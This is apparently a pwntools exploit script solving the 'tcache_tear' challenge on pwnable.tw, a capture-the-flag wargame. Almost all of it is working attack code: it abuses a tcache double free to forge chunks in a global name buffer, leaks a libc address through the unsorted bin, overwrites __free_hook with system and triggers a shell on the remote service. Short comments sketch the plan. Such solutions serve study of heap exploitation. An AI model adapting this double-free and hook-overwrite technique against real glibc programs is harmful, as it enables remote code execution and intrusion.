from pwn import *

# io = process("./tcache_tear")
io = remote("chall.pwnable.tw", 10207)
l = ELF("libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so")

def name(s):
	io.sendafter("Name:", s)
def choose(i):
	io.sendlineafter("Your choice :", str(i))

def malloc(size, val):
	choose(1)
	io.sendafter("Size:", str(size))
	io.sendafter("Data:", val)
def free():
	choose(2)
def info():
	choose(3)
def fchunk(chunk_size, fd):
	return p64(0) + p64(chunk_size) + p64(fd) + p64(0)

"""
1. how to leak libc addr
1.1 only read mem through print(name) => so somehow libc_addr must be linked to name
=> not tcache bins, it must be unsorted bin
1.2 construct the fake chunk at name isnot enough => double free check so must construct next_chunk as well (not needed if luckly)
1.3 next_chunk not enough => next of next_chunk
1.4 hook free
"""

nameBuf = 0x0000000000602060

name(fchunk(0x421, 0))

# 1. construct next_chunk of fake chunk
# tcache_dup
malloc(0x50, "A")
free()
free()

# tcache = m_0x60 -> cmem
malloc(0x50,	p64(nameBuf + 0x420))	
malloc(0x50,	"A")
malloc(0x50,	fchunk(0x21, 0) + fchunk(0x21, 0))	# ptr = cmem, next_chunk.pre_inuse = 1

# 2. construct fake_chunk, tcache.count m_0x30 randomized so use 0x40
# tcache_dup
malloc(0x30, "A")
free()
free()

# tcache = m_0x40 -> cmem
malloc(0x30,	p64(nameBuf + 0x10))	
malloc(0x30,	"A")
malloc(0x30,	p64(0)*2)	# ptr = cmem

free()	# nameBuf.next = m_0x40
info()

io.recvuntil("Name :")
ub_at = u64(io.recv(0x20)[0x10:0x18])
l.address = ub_at - 0x3ebca0
system_at = l.symbols['system']
free_hook = l.symbols['__free_hook']

print "unsorted_bin_at {}".format(hex(ub_at))
print "system {}".format(hex(system_at))
print "free_hook {}".format(hex(free_hook))

# 3. overwrite free_hook
malloc(0x40, "A")
free()
free()
malloc(0x40, p64(free_hook - 0x8))
malloc(0x40, "A")
malloc(0x40, "/bin/sh\x00" + p64(system_at))

io.interactive()
